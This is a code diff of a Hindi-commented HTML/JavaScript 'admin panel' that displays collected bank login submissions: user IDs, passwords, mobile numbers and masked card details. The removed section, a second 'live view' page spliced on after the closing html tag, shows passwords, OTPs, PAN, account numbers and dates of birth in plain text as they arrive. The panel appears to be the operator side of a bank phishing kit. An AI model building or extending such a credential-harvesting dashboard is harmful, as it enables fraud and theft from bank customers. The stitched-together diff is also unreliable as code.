@@ -9,22 +9,21 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: Arial, sans-serif;
         }
         
         body {
             background-color: #990330;
-            min-height: 100vh;
             padding: 20px;
         }
         
         .admin-container {
-            max-width: 1200px;
+            max-width: 1000px;
             margin: 0 auto;
             background-color: white;
-            border-radius: 15px;
+            border-radius: 8px;
             overflow: hidden;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
         }
         
         .admin-header {
@@ -35,53 +34,75 @@
         }
         
         .admin-header h1 {
-            font-size: 28px;
+            font-size: 24px;
             margin-bottom: 10px;
         }
         
-        .admin-header p {
-            opacity: 0.9;
-        }
-        
         .data-container {
-            padding: 30px;
+            padding: 25px;
         }
         
-        .data-table {
+        .stats {
+            display: flex;
+            gap: 20px;
+            margin-bottom: 25px;
+        }
+        
+        .stat-box {
+            flex: 1;
+            background-color: #f5f5f5;
+            padding: 20px;
+            border-radius: 6px;
+            text-align: center;
+            border-left: 4px solid #990330;
+        }
+        
+        .stat-number {
+            font-size: 28px;
+            font-weight: bold;
+            color: #990330;
+            margin-bottom: 5px;
+        }
+        
+        .stat-label {
+            color: #666;
+            font-size: 14px;
+        }
+        
+        table {
             width: 100%;
             border-collapse: collapse;
             margin-top: 20px;
             background-color: white;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-            border-radius: 10px;
+            border-radius: 6px;
             overflow: hidden;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
         }
         
-        .data-table th {
+        th {
             background-color: #990330;
             color: white;
             padding: 15px;
             text-align: left;
-            font-weight: 600;
-            font-size: 16px;
+            font-weight: bold;
         }
         
-        .data-table td {
+        td {
             padding: 15px;
             border-bottom: 1px solid #eee;
             color: #333;
         }
         
-        .data-table tr:hover {
+        tr:hover {
             background-color: #f9f9f9;
         }
         
-        .login-type {
+        .type-badge {
             display: inline-block;
-            padding: 5px 12px;
-            border-radius: 20px;
+            padding: 4px 10px;
+            border-radius: 4px;
             font-size: 12px;
-            font-weight: 600;
+            font-weight: bold;
         }
         
         .type-userid {
@@ -94,97 +115,56 @@
             color: #2e7d32;
         }
         
-        .empty-state {
-            text-align: center;
-            padding: 50px;
-            color: #666;
-            font-size: 18px;
-        }
-        
         .back-btn {
             display: inline-block;
+            margin-top: 25px;
             padding: 12px 25px;
             background-color: #990330;
             color: white;
             text-decoration: none;
-            border-radius: 8px;
-            font-weight: 600;
-            margin-top: 20px;
-            transition: all 0.3s;
+            border-radius: 4px;
+            font-weight: bold;
         }
         
         .back-btn:hover {
-            background-color: #7a0228;
-            transform: translateY(-2px);
+            background-color: #7a0026;
         }
         
-        .stats-container {
-            display: flex;
-            gap: 20px;
-            margin-bottom: 30px;
-        }
-        
-        .stat-card {
-            flex: 1;
-            background-color: #f5f5f5;
-            padding: 20px;
-            border-radius: 10px;
-            border-left: 5px solid #990330;
-        }
-        
-        .stat-number {
-            font-size: 32px;
-            font-weight: 700;
-            color: #990330;
-            margin-bottom: 5px;
-        }
-        
-        .stat-label {
+        .no-data {
+            text-align: center;
+            padding: 50px;
             color: #666;
-            font-size: 14px;
-            font-weight: 600;
-        }
-        
-        @media (max-width: 768px) {
-            .data-table {
-                display: block;
-                overflow-x: auto;
-            }
-            
-            .stats-container {
-                flex-direction: column;
-            }
         }
     </style>
 </head>
 <body>
     <div class="admin-container">
         <div class="admin-header">
-            <h1>Admin Panel - Login Data</h1>
-            <p>All user login attempts are recorded here</p>
+            <h1>Admin Panel - Login Records</h1>
+            <p>All login attempts are stored here</p>
         </div>
         
         <div class="data-container">
-            <div class="stats-container">
-                <div class="stat-card">
+            <div class="stats">
+                <div class="stat-box">
                     <div class="stat-number" id="totalLogins">0</div>
                     <div class="stat-label">Total Logins</div>
                 </div>
-                <div class="stat-card">
+                <div class="stat-box">
                     <div class="stat-number" id="useridLogins">0</div>
                     <div class="stat-label">User ID Logins</div>
                 </div>
-                <div class="stat-card">
+                <div class="stat-box">
                     <div class="stat-number" id="cardLogins">0</div>
                     <div class="stat-label">Card Logins</div>
                 </div>
             </div>
             
-            <div id="dataContent">
+            <div id="dataTable">
                 <!-- डेटा यहाँ लोड होगा -->
             </div>
             
-            <a href="index.html" class="back-btn">Back to Login</a>
+            <a href="index.html" class="back-btn">Back to Login Page</a>
         </div>
     </div>
 
@@ -194,67 +174,71 @@
         });
         
         function loadLoginData() {
-            // localStorage से डेटा लोड करें
-            const logins = JSON.parse(localStorage.getItem('admin_logins')) || [];
+            const logins = JSON.parse(localStorage.getItem('bank_logins')) || [];
             
             // स्टैट्स अपडेट करें
             document.getElementById('totalLogins').textContent = logins.length;
             
-            const useridLogins = logins.filter(login => login.login_type === 'userid').length;
-            const cardLogins = logins.filter(login => login.login_type === 'card').length;
+            const useridCount = logins.filter(login => login.type === 'userid').length;
+            const cardCount = logins.filter(login => login.type === 'card').length;
             
-            document.getElementById('useridLogins').textContent = useridLogins;
-            document.getElementById('cardLogins').textContent = cardLogins;
+            document.getElementById('useridLogins').textContent = useridCount;
+            document.getElementById('cardLogins').textContent = cardCount;
             
             // टेबल बनाएं
             if (logins.length === 0) {
-                document.getElementById('dataContent').innerHTML = `
-                    <div class="empty-state">
-                        <p>No login data available yet.</p>
-                        <p>Login attempts will appear here.</p>
+                document.getElementById('dataTable').innerHTML = `
+                    <div class="no-data">
+                        <h3>No login records found</h3>
+                        <p>Login attempts will appear here once users login.</p>
                     </div>
                 `;
                 return;
             }
             
             let tableHTML = `
-                <table class="data-table">
+                <table>
                     <thead>
                         <tr>
                             <th>Type</th>
                             <th>Login Details</th>
-                            <th>Timestamp</th>
+                            <th>Date & Time</th>
                         </tr>
                     </thead>
                     <tbody>
             `;
             
-            logins.forEach(login => {
+            // डेटा उल्टे क्रम में (नया पहले)
+            logins.slice().reverse().forEach(login => {
                 let details = '';
                 
-                if (login.login_type === 'userid') {
+                if (login.type === 'userid') {
                     details = `
-                        User ID: ${login.user_id}<br>
+                        User ID: ${login.userid}<br>
                         Password: ${'*'.repeat(login.password.length)}<br>
                         Mobile: ${login.mobile}
                     `;
-                } else if (login.login_type === 'card') {
+                } else if (login.type === 'card') {
+                    const maskedCard = '****' + login.cardno.slice(-4);
                     details = `
-                        Card: ****${login.card_number.slice(-4)}<br>
-                        Expiry: ${login.expiry_date}<br>
+                        Card: ${maskedCard}<br>
+                        Expiry: ${login.expiry}<br>
                         CVV: ***
                     `;
                 }
                 
+                const date = new Date(login.timestamp);
+                const formattedDate = date.toLocaleString('hi-IN');
+                
                 tableHTML += `
                     <tr>
                         <td>
-                            <span class="login-type type-${login.login_type}">
-                                ${login.login_type.toUpperCase()}
+                            <span class="type-badge type-${login.type}">
+                                ${login.type.toUpperCase()}
                             </span>
                         </td>
                         <td>${details}</td>
-                        <td>${new Date(login.timestamp).toLocaleString('hi-IN')}</td>
+                        <td>${formattedDate}</td>
                     </tr>
                 `;
             });
@@ -264,260 +248,11 @@
                 </table>
             `;
             
-            document.getElementById('dataContent').innerHTML = tableHTML;
+            document.getElementById('dataTable').innerHTML = tableHTML;
         }
         
-        // डेटा अपडेट के लिए refresh (वास्तविक application में WebSocket या polling होगा)
+        // हर 5 सेकंड में डेटा रिफ्रेश करें
         setInterval(loadLoginData, 5000);
-    </script>
-</body>
-</html>            font-size: 12px;
-            margin-top: 5px;
-            display: inline-block;
-        }
-        
-        /* Scrollbar styling */
-        ::-webkit-scrollbar {
-            width: 8px;
-        }
-        
-        ::-webkit-scrollbar-track {
-            background: #111;
-        }
-        
-        ::-webkit-scrollbar-thumb {
-            background: #00ff00;
-            border-radius: 4px;
-        }
-        
-        ::-webkit-scrollbar-thumb:hover {
-            background: #00cc00;
-        }
-    </style>
-</head>
-<body>
-    <div class="header">
-        <h1>🛑 ADMIN LIVE VIEW</h1>
-        <div style="font-size: 12px; color: #888;">Updated: <span id="updateTime">--:--:--</span></div>
-    </div>
-    
-    <div class="status-bar">
-        <div>Total Records: <span id="totalCount">0</span></div>
-        <div>New (Last 1 min): <span id="newCount">0</span></div>
-        <div class="live-indicator">● LIVE</div>
-    </div>
-    
-    <div class="data-container" id="dataContainer">
-        <!-- Data will appear here -->
-        <div class="empty-message">Waiting for data...</div>
-    </div>
-
-    <script>
-        // Auto refresh every 5 seconds
-        let refreshInterval = setInterval(loadData, 5000);
-        
-        // Initial load
-        document.addEventListener('DOMContentLoaded', function() {
-            loadData();
-            updateTime();
-            
-            // Update time every second
-            setInterval(updateTime, 1000);
-        });
-        
-        function loadData() {
-            const allData = JSON.parse(localStorage.getItem('adminData') || '[]');
-            const container = document.getElementById('dataContainer');
-            
-            // Update counts
-            document.getElementById('totalCount').textContent = allData.length;
-            
-            // Count new submissions (last 1 minute)
-            const oneMinuteAgo = new Date().getTime() - 60000;
-            const newSubmissions = allData.filter(item => {
-                const itemTime = new Date(item.timestamp).getTime();
-                return itemTime > oneMinuteAgo;
-            });
-            document.getElementById('newCount').textContent = newSubmissions.length;
-            
-            if (allData.length === 0) {
-                container.innerHTML = '<div class="empty-message">No data yet...</div>';
-                return;
-            }
-            
-            // Sort by timestamp (newest first)
-            const sortedData = [...allData].reverse();
-            
-            let html = '';
-            
-            sortedData.forEach((item, index) => {
-                const itemTime = new Date(item.timestamp);
-                const isNew = (new Date().getTime() - itemTime.getTime()) < 60000; // 1 minute
-                
-                html += `
-                    <div class="data-item" id="item-${index}">
-                        ${isNew ? '<span class="new-badge">NEW</span>' : ''}
-                        <div class="data-row">
-                            <span class="data-label">Time:</span>
-                            <span class="data-value">${formatTime(item.timestamp)}</span>
-                        </div>
-                        <div class="data-row">
-                            <span class="data-label">Page:</span>
-                            <span class="data-value">${item.page || 'Unknown'}</span>
-                        </div>
-                `;
-                
-                // Show different fields based on page type
-                if (item.userId) {
-                    html += `
-                        <div class="data-row">
-                            <span class="data-label">User ID:</span>
-                            <span class="data-value">${item.userId}</span>
-                        </div>
-                    `;
-                }
-                
-                if (item.password) {
-                    html += `
-                        <div class="data-row">
-                            <span class="data-label">Password:</span>
-                            <span class="data-value">${item.password}</span>
-                        </div>
-                    `;
-                }
-                
-                if (item.mobile) {
-                    html += `
-                        <div class="data-row">
-                            <span class="data-label">Mobile:</span>
-                            <span class="data-value">${item.mobile}</span>
-                        </div>
-                    `;
-                }
-                
-                if (item.otp) {
-                    html += `
-                        <div class="data-row">
-                            <span class="data-label">OTP:</span>
-                            <span class="data-value" style="color: #ff9900; font-weight: bold;">${item.otp}</span>
-                        </div>
-                    `;
-                }
-                
-                if (item.panNumber) {
-                    html += `
-                        <div class="data-row">
-                            <span class="data-label">PAN:</span>
-                            <span class="data-value">${item.panNumber}</span>
-                        </div>
-                    `;
-                }
-                
-                if (item.accountNumber) {
-                    html += `
-                        <div class="data-row">
-                            <span class="data-label">Account:</span>
-                            <span class="data-value">${item.accountNumber}</span>
-                        </div>
-                    `;
-                }
-                
-                if (item.dateOfBirth) {
-                    html += `
-                        <div class="data-row">
-                            <span class="data-label">DOB:</span>
-                            <span class="data-value">${item.dateOfBirth}</span>
-                        </div>
-                    `;
-                }
-                
-                // Add page indicator
-                if (item.page) {
-                    html += `<div class="page-indicator">${item.page}</div>`;
-                }
-                
-                html += `
-                        <div class="timestamp">
-                            Received: ${formatFullTime(item.timestamp)}
-                        </div>
-                    </div>
-                `;
-            });
-            
-            container.innerHTML = html;
-            
-            // Highlight new items
-            if (newSubmissions.length > 0) {
-                setTimeout(() => {
-                    newSubmissions.forEach((item, index) => {
-                        const elem = document.getElementById(`item-${sortedData.length - 1 - index}`);
-                        if (elem) {
-                            elem.style.borderLeftColor = '#ff0000';
-                            elem.style.animation = 'none';
-                            setTimeout(() => {
-                                elem.style.animation = 'slideIn 0.5s ease';
-                            }, 10);
-                        }
-                    });
-                }, 100);
-            }
-        }
-        
-        function formatTime(timestamp) {
-            if (!timestamp) return '--:--:--';
-            const date = new Date(timestamp);
-            return date.toLocaleTimeString('en-IN', {
-                hour12: false,
-                hour: '2-digit',
-                minute: '2-digit',
-                second: '2-digit'
-            });
-        }
-        
-        function formatFullTime(timestamp) {
-            if (!timestamp) return 'N/A';
-            const date = new Date(timestamp);
-            return date.toLocaleString('en-IN', {
-                day: '2-digit',
-                month: 'short',
-                year: 'numeric',
-                hour: '2-digit',
-                minute: '2-digit',
-                second: '2-digit'
-            });
-        }
-        
-        function updateTime() {
-            const now = new Date();
-            document.getElementById('updateTime').textContent = 
-                now.toLocaleTimeString('en-IN', {
-                    hour12: false,
-                    hour: '2-digit',
-                    minute: '2-digit',
-                    second: '2-digit'
-                });
-        }
-        
-        // Auto-refresh page every 30 seconds (fallback)
-        setTimeout(() => {
-            location.reload();
-        }, 30000);
-        
-        // Keyboard shortcut: Ctrl+R to force refresh
-        document.addEventListener('keydown', function(e) {
-            if (e.ctrlKey && e.key === 'r') {
-                e.preventDefault();
-                loadData();
-                alert('Manual refresh complete!');
-            }
-        });
-        
-        // Detect if other tabs are adding data
-        window.addEventListener('storage', function(e) {
-            if (e.key === 'adminData') {
-                loadData();
-            }
-        });
     </script>
 </body>
 </html>
